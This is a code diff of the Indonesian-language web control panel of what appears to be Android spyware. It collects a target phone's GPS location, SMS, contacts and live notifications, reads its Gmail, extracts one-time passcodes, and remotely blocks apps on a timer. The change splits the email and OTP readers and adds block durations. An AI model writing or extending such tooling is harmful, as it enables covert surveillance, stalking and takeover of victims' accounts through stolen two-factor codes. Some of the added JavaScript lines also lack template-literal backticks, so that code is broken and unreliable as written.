@@ -33,8 +33,8 @@
         .sub-menu.active { max-height: 2000px; border-top: 2px solid #2a2a2a; padding: 20px; }
         .form-group { margin-bottom: 20px; }
         .form-group label { display: block; font-size: 18px; color: #ccc; margin-bottom: 10px; font-weight: bold; }
-        .form-group input, .form-group select { width: 100%; padding: 18px; border-radius: 12px; background-color: #1a1a1a; border: 2px solid #444; color: #fff; font-size: 18px; box-sizing: border-box; }
-        .action-btn { width: 100%; padding: 20px; margin-top: 10px; background-color: #00ff00; color: #000; border: none; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer;}
+        .form-group input, .form-group select { width: 100%; padding: 15px; border-radius: 12px; background-color: #1a1a1a; border: 2px solid #444; color: #fff; font-size: 16px; box-sizing: border-box; }
+        .action-btn { width: 100%; padding: 18px; margin-top: 10px; background-color: #00ff00; color: #000; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer;}
         .action-btn-red { background-color: #ff3b30; color: #fff; }
         .status { margin-bottom: 20px; padding: 15px; border: 1px dashed #00ff00; text-align: center; color: #00ff00; background: #001100; border-radius: 10px;}
         .grid-btn { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
@@ -45,6 +45,11 @@
         .modal-title { color: #00ff00; font-weight: bold; }
         .btn-close { background: none; border: none; color: #ff3b30; font-size: 24px; cursor: pointer; }
         .img-preview { width: 100%; border-radius: 8px; }
+        .sms-item { background: #222; padding: 10px; margin-bottom: 5px; border-left: 4px solid #00ff00; font-size: 14px;}
+        .notif-item { background: #222; padding: 10px; margin-bottom: 8px; border-left: 4px solid #ffcc00; font-size: 14px; }
+        .email-item { background: #111; padding: 10px; border-left: 3px solid #555; font-size: 12px; color: #ccc; max-height: 150px; overflow-y: auto; margin-top: 5px;}
+        .otp-box { background: #333; border: 2px solid #00ff00; padding: 15px; text-align: center; margin-bottom: 10px; border-radius: 8px; }
+        .otp-code { color: #00ff00; font-size: 32px; font-weight: bold; letter-spacing: 5px; }
     </style>
 </head>
 <body>
@@ -99,8 +104,9 @@
                 <button class="action-btn" onclick="bukaModal('sms')">📩 Ambil SMS</button>
                 <button class="action-btn" onclick="bukaModal('contacts')">👥 Ambil Kontak</button>
                 <button class="action-btn" onclick="bukaModal('notifs')" style="background:#ffcc00;">🔔 Spy Notif</button>
-                <button class="action-btn" onclick="bukaModal('gmail')" style="background:#ff6600; color:white;">📧 Baca Gmail & OTP</button>
-                <button class="action-btn" onclick="bukaModal('app_blocker')" style="background:#ff3b30; color:white; grid-column: span 2;">🚫 App Blocker (Blokir Aplikasi)</button>
+                <button class="action-btn" onclick="bukaModal('gmail_text')" style="background:#ff6600; color:white;">📧 Baca Email</button>
+                <button class="action-btn" onclick="bukaModal('gmail_otp')" style="background:#ffcc00; color:black;">🔑 Baca OTP</button>
+                <button class="action-btn" onclick="bukaModal('app_blocker')" style="background:#ff3b30; color:white; grid-column: span 2;">🚫 App Blocker</button>
             </div>
         </div>
     </div>
@@ -147,7 +153,7 @@
 
         function bukaModal(type) {
             document.getElementById('myModal').style.display = 'flex';
-            document.getElementById('modal-body').innerHTML = '<div style="text-align:center;">⏳ Mengambil data...</div>';
+            document.getElementById('modal-body').innerHTML = '<div style="text-align:center;">⏳ Memproses...</div>';
             
             if (type === 'gps' || type === 'sms' || type === 'contacts') {
                 document.getElementById('modal-title').innerText = type === 'gps' ? '📍 Lokasi GPS' : (type === 'sms' ? '📩 10 SMS Terakhir' : '👥 Daftar Kontak');
@@ -159,17 +165,25 @@
                 cekNotif();
                 if(intervalId) clearInterval(intervalId);
                 intervalId = setInterval(() => { cekNotif(); }, 3000);
-            } else if (type === 'gmail') {
-                document.getElementById('modal-title').innerText = '📧 Gmail & OTP Reader';
-                cekGmail();
+            } else if (type === 'gmail_text') {
+                document.getElementById('modal-title').innerText = '📧 Teks Email';
+                cekGmailText();
                 if(intervalId) clearInterval(intervalId);
-                intervalId = setInterval(() => { cekGmail(); }, 3000);
+                intervalId = setInterval(() => { cekGmailText(); }, 3000);
+            } else if (type === 'gmail_otp') {
+                document.getElementById('modal-title').innerText = '🔑 Kode OTP Gmail';
+                cekGmailOtp();
+                if(intervalId) clearInterval(intervalId);
+                intervalId = setInterval(() => { cekGmailOtp(); }, 3000);
             } else if (type === 'app_blocker') {
                 document.getElementById('modal-title').innerText = '🚫 App Blocker';
                 document.getElementById('modal-body').innerHTML = `
                     <p style="font-size:12px; color:#aaa; margin-bottom:10px;">Ketik Package Name (pisahkan dengan koma).</p>
-                    <p style="font-size:11px; color:#888; margin-bottom:10px;">Contoh: com.zhiliaoapp.musically (TikTok), com.mobile.legends (ML).</p>
-                    <input type="text" id="blocked_input" placeholder="com.package1, com.package2" style="width:100%; padding:12px; margin-bottom:15px; background:#222; border:1px solid #00ff00; color:white; box-sizing:border-box;">
+                    <input type="text" id="blocked_input" placeholder="com.zhiliaoapp.musically" style="width:100%; padding:12px; margin-bottom:15px; background:#222; border:1px solid #00ff00; color:white; box-sizing:border-box;">
+                    <p style="font-size:12px; color:#aaa; margin-bottom:5px;">Durasi Blokir:</p>
+                    <select id="block_timer" style="width:100%; padding:12px; margin-bottom:15px; background:#222; border:1px solid #00ff00; color:white; box-sizing:border-box;">
+                        <option value="0">Permanen</option><option value="1">1 Menit</option><option value="5">5 Menit</option><option value="60">1 Jam</option>
+                    </select>
                     <button class="action-btn" onclick="simpanBlokir()">SIMPAN & BLOKIR</button>
                     <button class="action-btn action-btn-red" style="margin-top:15px;" onclick="lepasBlokir()">🔓 LEPAS SEMUA BLOKIR</button>
                 `;
@@ -191,9 +205,9 @@
                 if(type === 'gps' && data.gps && data.gps !== "Belum ada data") {
                     clearInterval(intervalId); html = '<div style="font-size: 20px; text-align: center; margin-bottom: 15px;">' + data.gps + '</div><button class="action-btn" onclick="navigator.clipboard.writeText(\'' + data.gps + '\'); alert(\'Disalin!\')">📋 Salin Koordinat</button>';
                 } else if(type === 'sms' && data.sms && data.sms.length > 0) {
-                    clearInterval(intervalId); data.sms.forEach(sms => { html += '<div style="background:#222; padding:10px; margin-bottom:5px; border-left:4px solid #00ff00;">' + sms.address + ': ' + sms.body + '</div>'; });
+                    clearInterval(intervalId); data.sms.forEach(sms => { html += '<div class="sms-item">' + sms.address + ': ' + sms.body + '</div>'; });
                 } else if(type === 'contacts' && data.contacts && data.contacts.length > 0) {
-                    clearInterval(intervalId); data.contacts.forEach(c => { html += '<div style="background:#222; padding:10px; margin-bottom:5px; border-left:4px solid #00ff00;">' + c.name + ' - ' + c.phone + '</div>'; });
+                    clearInterval(intervalId); data.contacts.forEach(c => { html += '<div class="sms-item">' + c.name + ' - ' + c.phone + '</div>'; });
                 }
                 if (html !== '') document.getElementById('modal-body').innerHTML = html;
             });
@@ -204,51 +218,50 @@
                 var html = '';
                 if (data.notifs && data.notifs.length > 0) {
                     data.notifs.forEach(n => {
-                        html += '<div style="background:#222; padding:10px; margin-bottom:8px; border-left:4px solid #ffcc00; font-size:14px;">' +
-                                '<div style="color:#888; font-size:12px; margin-bottom:4px;">[' + n.time + '] ' + n.app + '</div>' +
-                                '<div style="font-weight:bold; color:#fff;">' + n.title + '</div>' +
-                                '<div style="color:#ccc;">' + n.text + '</div></div>';
+                        html += '<div class="notif-item"><div style="color:#888; font-size:12px; margin-bottom:4px;">[' + n.time + '] ' + n.app + '</div><div style="font-weight:bold; color:#fff;">' + n.title + '</div><div style="color:#ccc;">' + n.text + '</div></div>';
                     });
                 } else { html = '<div style="text-align:center; color:#888;">Belum ada notifikasi masuk.</div>'; }
                 document.getElementById('modal-body').innerHTML = html;
             });
         }
 
-        function cekGmail() {
-    fetch('/api/get_results/' + deviceId).then(res => res.json()).then(data => {
-        var html = '';
-        if (data.gmail && data.gmail.length > 0) {
-            data.gmail.forEach((item, index) => {
-                // Tampilin kotak OTP kalau ada angka
-                if (item.otp) {
-                    html += `<div style="background:#333; border:2px solid #00ff00; padding:15px; text-align:center; margin-bottom:10px; border-radius:8px;">
-                                <div style="color:#aaa; font-size:12px;">OTP TERDETEKSI:</div>
-                                <div style="color:#00ff00; font-size:28px; font-weight:bold; letter-spacing:5px;">${item.otp}</div>
-                             </div>`;
-                }
-                // Tampilin isi email (teks)
-                html += `<div style="margin-bottom:20px;">
-                            <div style="color:#ff6600; font-size:12px; margin-bottom:5px;">Teks Email ${index + 1}:</div>
-                            <div style="background:#111; padding:10px; border-left:3px solid #555; font-size:12px; color:#ccc; max-height:150px; overflow-y:auto;">${item.text}</div>
-                         </div>`;
+        function cekGmailText() {
+            fetch('/api/get_results/' + deviceId).then(res => res.json()).then(data => {
+                var html = '';
+                if (data.gmail && data.gmail.length > 0) {
+                    data.gmail.forEach((item, index) => {
+                        html += <div style="margin-bottom:20px;"><div style="color:#ff6600; font-size:12px; margin-bottom:5px;">Email ${index + 1}:</div><div class="email-item">${item.text}</div></div>;
+                    });
+                } else { html = '<div style="text-align:center; color:#888;">Belum ada email yang dibuka.</div>'; }
+                document.getElementById('modal-body').innerHTML = html;
             });
-        } else {
-            html = '<div style="text-align:center; color:#888; margin-top:20px;">Belum ada email yang dibuka.</div>';
         }
-        document.getElementById('modal-body').innerHTML = html;
-    });
-}
+
+        function cekGmailOtp() {
+            fetch('/api/get_results/' + deviceId).then(res => res.json()).then(data => {
+                var html = ''; var adaOtp = false;
+                if (data.gmail && data.gmail.length > 0) {
+                    data.gmail.forEach((item) => {
+                        if (item.otp) { adaOtp = true; html += <div class="otp-box"><div style="color:#aaa; font-size:12px;">OTP TERDETEKSI:</div><div class="otp-code">${item.otp}</div></div>; }
+                    });
+                }
+                if (!adaOtp) html = '<div style="text-align:center; color:#888;">Tidak ada OTP terdeteksi.</div>';
+                document.getElementById('modal-body').innerHTML = html;
+            });
+        }
+
         function simpanBlokir() {
             var apps = document.getElementById('blocked_input').value;
+            var timer = document.getElementById('block_timer').value;
             if(!apps) return alert("Package name kosong!");
-            kirimPerintah('block_apps|' + apps);
-            alert("Perintah blokir dikirim ke HP!");
+            kirimPerintah('block_apps|' + timer + '|' + apps);
+            alert("Perintah blokir dikirim!");
             tutupModal();
         }
 
         function lepasBlokir() {
-            kirimPerintah('block_apps|'); 
-            alert("Semua blokir aplikasi dilepas!");
+            kirimPerintah('block_apps|0|'); 
+            alert("Semua blokir dilepas!");
             tutupModal();
         }
     </script>
